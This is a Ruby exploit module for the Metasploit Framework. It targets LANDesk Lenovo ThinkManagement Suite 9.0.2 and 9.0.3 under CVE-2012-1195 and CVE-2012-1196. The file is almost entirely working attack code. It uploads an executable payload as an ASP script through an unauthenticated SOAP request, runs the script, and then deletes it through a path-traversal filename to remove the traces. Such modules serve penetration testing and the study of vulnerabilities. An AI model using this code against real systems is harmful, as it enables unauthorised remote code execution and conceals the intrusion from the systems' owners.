##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize
        super(
            'Name'        => 'LANDesk Lenovo ThinkManagement Console Remote Command Execution',
            'Description'    => %q{
                    This module can be used to execute a payload on LANDesk Lenovo
                ThinkManagement Suite 9.0.2 and 9.0.3.
 
                The payload is uploaded as an ASP script by sending a specially crafted
                SOAP request to "/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx"
                , via a "RunAMTCommand" operation with the command '-PutUpdateFileCore'
                as the argument.
 
                After execution, the ASP script with the payload is deleted by sending
                another specially crafted SOAP request to "WSVulnerabilityCore/VulCore.asmx"
                via a "SetTaskLogByFile" operation.
            },
            'Author'      => [
                'Andrea Micalizzi', # aka rgod - Vulnerability Discovery and PoC
                'juan vazquez' # Metasploit module
            ],
            'Version'     => '$Revision: $',
            'Platform'    => 'win',
            'References'  =>
                [
                    ['CVE', '2012-1195'],
                    ['CVE', '2012-1196'],
                    ['OSVDB', '79276'],
                    ['OSVDB', '79277'],
                    ['BID', '52023'],
                    ['URL', 'http://www.exploit-db.com/exploits/18622/'],
                    ['URL', 'http://www.exploit-db.com/exploits/18623/']
                ],
            'Targets'     =>
                [
                    [ 'LANDesk Lenovo ThinkManagement Suite 9.0.2 / 9.0.3 / Microsoft Windows Server 2003 SP2', { } ],
                ],
            'DefaultTarget'  => 0,
            'Privileged'     => false,
            'DisclosureDate' => 'Feb 15 2012'
        )
 
        register_options(
            [
                OptString.new('PATH', [ true,  "The URI path of the LANDesk Lenovo ThinkManagement Console", '/'])
            ], self.class)
    end
 
    def exploit
 
        peer = "#{rhost}:#{rport}"
 
        # Generate the ASP containing the EXE containing the payload
        exe = generate_payload_exe
        asp = Msf::Util::EXE.to_exe_asp(exe)
 
        # htmlentities like encoding
        asp = asp.gsub("&", "&amp;").gsub("\"", "&quot;").gsub("'", "&#039;").gsub("<", "&lt;").gsub(">", "&gt;")
 
        uri_path = (datastore['PATH'][-1,1] == "/" ? datastore['PATH'] : datastore['PATH'] + "/")
        upload_random = rand_text_alpha(rand(6) + 6)
        upload_xml_path = "ldlogon\\#{upload_random}.asp"
 
        soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <RunAMTCommand xmlns="http://tempuri.org/">
            <Command>-PutUpdateFileCore</Command>
            <Data1>#{rand_text_alpha(rand(4) + 4)}</Data1>
            <Data2>#{upload_xml_path}</Data2>
            <Data3>#{asp}</Data3>
            <ReturnString>#{rand_text_alpha(rand(4) + 4)}</ReturnString>
        </RunAMTCommand>
    </soap:Body>
</soap:Envelope>
        eos
 
        #
        # UPLOAD
        #
        attack_url = uri_path + "landesk/managementsuite/core/core.anonymous/ServerSetup.asmx"
        print_status("#{peer} - Uploading #{asp.length} bytes through #{attack_url}...")
 
        res = send_request_cgi({
            'uri'          => attack_url,
            'method'       => 'POST',
            'ctype'        => 'text/xml; charset=utf-8',
            'headers'   => {
                    'SOAPAction'     => "\"http://tempuri.org/RunAMTCommand\"",
                },
            'data'         => soap,
        }, 20)
 
        if (! res)
            print_status("#{peer} - Timeout: Trying to execute the payload anyway")
        elsif (res.code < 200 or res.code >= 300)
            print_error("#{peer} - Upload failed on #{attack_url} [#{res.code} #{res.message}]")
            return
        end
 
        #
        # EXECUTE
        #
        upload_path = uri_path + "ldlogon/#{upload_random}.asp"
        print_status("#{peer} - Executing #{upload_path}...")
 
        res = send_request_cgi({
            'uri'          =>  upload_path,
            'method'       => 'GET'
        }, 20)
 
        if (! res)
            print_error("#{peer} - Execution failed on #{upload_path} [No Response]")
            return
        end
 
        if (res.code < 200 or res.code >= 300)
            print_error("#{peer} - Execution failed on #{upload_path} [#{res.code} #{res.message}]")
            return
        end
 
 
        #
        # DELETE
        #
        soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetTaskLogByFile xmlns="http://tempuri.org/">
            <computerIdn>1</computerIdn>
            <taskid>1</taskid>
            <filename>../#{upload_random}.asp</filename>
            </SetTaskLogByFile>
    </soap:Body>
</soap:Envelope>
        eos
 
        attack_url = uri_path + "WSVulnerabilityCore/VulCore.asmx"
        print_status("#{peer} - Deleting #{upload_path} through #{attack_url}...")
 
        res = send_request_cgi({
            'uri'          => attack_url,
            'method'       => 'POST',
            'ctype'        => 'text/xml; charset=utf-8',
            'headers'      => {
                    'SOAPAction'     => "\"http://tempuri.org/SetTaskLogByFile\"",
                },
            'data'         => soap,
        }, 20)
 
        if (! res)
            print_error("#{peer} - Deletion failed at #{attack_url} [No Response]")
            return
        elsif (res.code < 200 or res.code >= 300)
            print_error("#{peer} - Deletion failed at #{attack_url} [#{res.code} #{res.message}]")
            return
        end
 
        handler
    end
 
end
